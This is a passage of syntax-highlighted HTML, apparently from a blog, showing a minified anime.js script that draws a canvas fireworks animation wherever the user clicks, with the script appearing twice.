class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> t<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">360</span><span class="token punctuation">)</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token operator">/</span><span class="token number">180</span><span class="token punctuation">,</span>a<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">{</span>x<span class="token punctuation">:</span>e<span class="token punctuation">.</span>x<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span>e<span class="token punctuation">.</span>y<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span>colors<span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>colors<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>endPos<span class="token operator">=</span><span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span><span class="token string">"#F00"</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span>a<span class="token punctuation">.</span>alpha<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span>a<span class="token punctuation">.</span>lineWidth<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>strokeStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">renderParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>t<span class="token operator">&lt;</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">.</span>length<span class="token punctuation">;</span>t<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">animateParticules</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>numberOfParticules<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>n<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>anime<span class="token punctuation">.</span><span class="token function">timeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>n<span class="token punctuation">,</span>x<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>x<span class="token punctuation">}</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>y<span class="token punctuation">}</span><span class="token punctuation">,</span>radius<span class="token punctuation">:</span><span class="token number">0.1</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>a<span class="token punctuation">,</span>radius<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lineWidth<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>alpha<span class="token punctuation">:</span><span class="token punctuation">{</span>value<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"linear"</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">,</span>offset<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> n<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">,</span>i<span class="token operator">=</span>arguments<span class="token punctuation">;</span><span class="token function">clearTimeout</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token operator">=</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> canvasEl<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".fireworks"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>canvasEl<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> ctx<span class="token operator">=</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>numberOfParticules<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>pointerX<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>pointerY<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>tap<span class="token operator">=</span><span class="token string">"mousedown"</span><span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"#FF1461"</span><span class="token punctuation">,</span><span class="token string">"#18FF92"</span><span class="token punctuation">,</span><span class="token string">"#5A87FF"</span><span class="token punctuation">,</span><span class="token string">"#FBF38C"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>setCanvasSize<span class="token operator">=</span><span class="token function">debounce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>canvasEl<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token operator">=</span>window<span class="token punctuation">.</span>innerWidth<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height<span class="token operator">=</span>window<span class="token punctuation">.</span>innerHeight<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>render<span class="token operator">=</span><span class="token function">anime</span><span class="token punctuation">(</span><span class="token punctuation">{</span>duration<span class="token punctuation">:</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>width<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>tap<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token string">"sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"toggle-sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"A"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token string">"IMG"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>render<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">animateParticules</span><span class="token punctuation">(</span>pointerX<span class="token punctuation">,</span>pointerY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">setCanvasSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"resize"</span><span class="token punctuation">,</span>setCanvasSize<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>pointerX<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>clientX<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientX<span class="token punctuation">)</span><span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>left<span class="token punctuation">,</span>pointerY<span class="token operator">=</span>e<span class="token punctuation">.</span>clientY<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientY<span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>top<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> t<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">360</span><span class="token punctuation">)</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token operator">/</span><span class="token number">180</span><span class="token punctuation">,</span>a<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">{</span>x<span class="token punctuation">:</span>e<span class="token punctuation">.</span>x<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span>e<span class="token punctuation">.</span>y<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span>colors<span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>colors<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>endPos<span class="token operator">=</span><span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span><span class="token string">"#F00"</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span>a<span class="token punctuation">.</span>alpha<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span>a<span class="token punctuation">.</span>lineWidth<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>strokeStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">renderParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>t<span class="token operator">&lt;</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">.</span>length<span class="token punctuation">;</span>t<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">animateParticules</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>numberOfParticules<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>n<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>anime<span class="token punctuation">.</span><span class="token function">timeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>n<span class="token punctuation">,</span>x<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>x<span class="token punctuation">}</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>y<span class="token punctuation">}</span><span class="token punctuation">,</span>radius<span class="token punctuation">:</span><span class="token number">0.1</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>a<span class="token punctuation">,</span>radius<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lineWidth<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>alpha<span class="token punctuation">:</span><span class="token punctuation">{</span>value<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"linear"</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">,</span>offset<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> n<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">,</span>i<span class="token operator">=</span>arguments<span class="token punctuation">;</span><span class="token function">clearTimeout</span><span class="token 